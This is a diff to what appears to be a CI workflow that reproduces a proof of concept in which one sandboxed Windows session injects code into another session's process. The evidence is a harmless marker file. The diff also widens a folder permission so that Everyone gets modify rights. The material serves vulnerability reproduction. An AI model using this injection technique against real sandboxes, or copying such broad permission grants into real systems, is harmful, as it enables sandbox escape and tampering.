@@ -28,7 +28,7 @@ jobs:
           rustc --crate-type cdylib -O -o C:\srt-poc\marker.dll C:\srt-poc\marker.rs
           # Make sure BOTH sandboxed sessions (different token, but same
           # srt-sandbox user) can read it regardless of inherited ACLs.
-          icacls C:\srt-poc /grant "Everyone:(OI)(CI)RX" | Out-Null
+          icacls C:\srt-poc /grant "Everyone:(OI)(CI)M" | Out-Null
           Copy-Item inject_payload.ps1 C:\srt-poc\inject_payload.ps1
           Get-ChildItem C:\srt-poc
 
@@ -103,7 +103,7 @@ jobs:
 
           Write-Host ''
           Write-Host '=== Session B (attacker): injects into Session A target PID, from INSIDE its own sandbox ==='
-          Remove-Item -ErrorAction SilentlyContinue C:\PWNED_cross_session_injection.txt
+          Remove-Item -ErrorAction SilentlyContinue C:\srt-poc\PWNED_cross_session_injection.txt
           $psiB = New-Object System.Diagnostics.ProcessStartInfo
           $psiB.FileName = $Exe
           $psiB.UseShellExecute = $false
@@ -125,9 +125,9 @@ jobs:
           Write-Host ''
           Write-Host '=== Checking for the injection marker (written by code now running INSIDE Session A) ==='
           Start-Sleep -Seconds 2
-          if (Test-Path C:\PWNED_cross_session_injection.txt) {
+          if (Test-Path C:\srt-poc\PWNED_cross_session_injection.txt) {
             Write-Host '--- marker file content ---'
-            Get-Content C:\PWNED_cross_session_injection.txt
+            Get-Content C:\srt-poc\PWNED_cross_session_injection.txt
             Write-Host 'VERDICT: REPRODUCED - Session B injected and executed code inside Session A sandboxed process'
           } else {
             Write-Host 'VERDICT: NOT REPRODUCED - no marker file found'
